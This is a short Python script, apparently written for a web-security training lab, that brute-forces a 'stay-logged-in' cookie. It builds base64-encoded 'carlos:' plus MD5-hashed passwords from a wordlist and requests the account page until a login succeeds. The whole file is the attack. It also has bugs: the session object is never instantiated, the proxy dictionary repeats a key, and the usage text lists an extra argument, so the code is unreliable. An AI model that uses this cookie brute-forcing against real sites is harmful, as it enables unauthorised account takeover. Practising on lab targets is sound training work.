import requests
import sys
import urllib3
import hashlib
import base64

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http':'http://127.0.0.1', 'http':'https://127.0.0.1'}

def pass_carl():
    with open('password.txt','r') as f:
        password = [i.strip() for i in f]
    return password
def access_account(base_url,password):
    for pas in password:
        hash_pas = 'carlos:'+ hashlib.md5(pas.encode('utf-8')).hexdigest() # here the md5 function will not create hash.
        encod_pas = base64.b64encode(bytes(hash_pas,"utf-8")) #encode(utf-8) convert to bytes, this is another way of converting to bytes
        str_pas = encod_pas.decode('utf-8')
        
        r = requests.session
        url = base_url + "/my-account"
        cookies = {'stay-logged-in': str_pas}
        req = r.get(url,cookies=cookies,verify=False,proxies=proxies)
        if "Log out" in req.text:
            print(f"carlose password is {pas}")
            sys.exit(-1)
    


def main():
    if len(sys.argv) != 2:
        print("format = script.py <URL path> <payload>")
        sys.exit(-1)
    base_url = sys.argv[1]
    password = pass_carl()
    access_account(base_url,password)

if __name__ == "__main__":
    main()